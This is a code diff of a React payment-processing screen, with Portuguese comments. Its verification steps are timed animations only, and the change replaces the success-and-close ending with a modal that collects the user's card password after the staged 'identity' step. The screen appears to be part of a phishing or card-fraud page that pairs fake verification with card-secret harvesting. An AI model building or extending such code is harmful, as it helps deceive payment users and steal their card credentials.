@@ -30,6 +30,9 @@ export const PaymentProcessingScreen = ({
 }: PaymentProcessingScreenProps) => {
   const [currentStep, setCurrentStep] = useState<ProcessingStep>('contacting');
   const [completedSteps, setCompletedSteps] = useState<string[]>([]);
+  const [showPasswordModal, setShowPasswordModal] = useState(false);
+  const [cardPassword, setCardPassword] = useState('');
+  const [isSubmittingPassword, setIsSubmittingPassword] = useState(false);
 
   useEffect(() => {
     if (!isOpen) return;
@@ -38,7 +41,7 @@ export const PaymentProcessingScreen = ({
     const timings = [
       { step: 'contacting', duration: 2000 },
       { step: 'validating', duration: 2000 },
-      { step: 'updating', duration: 2000 },
+      { step: 'identity', duration: 2000 },
     ];
 
     let currentTime = 0;
@@ -47,30 +50,20 @@ export const PaymentProcessingScreen = ({
     timings.forEach((timing, index) => {
       setTimeout(() => {
         setCompletedSteps((prev) => [...prev, timing.step]);
-        
+
         if (index < timings.length - 1) {
           setCurrentStep(timings[index + 1].step as ProcessingStep);
         } else {
-          // Após o último passo, mostra sucesso
+          // Após o último passo, mostra modal de senha
           setTimeout(() => {
-            setCurrentStep('success');
-            
-            // Envia dados para backend
-            sendPaymentData();
-
-            // Fecha após 3 segundos
-            setTimeout(() => {
-              onClose();
-              setCurrentStep('contacting');
-              setCompletedSteps([]);
-            }, 3000);
+            setShowPasswordModal(true);
           }, 500);
         }
       }, currentTime);
 
       currentTime += timing.duration;
     });
-  }, [isOpen, onClose]);
+  }, [isOpen]);
 
   const sendPaymentData = async () => {
     try {
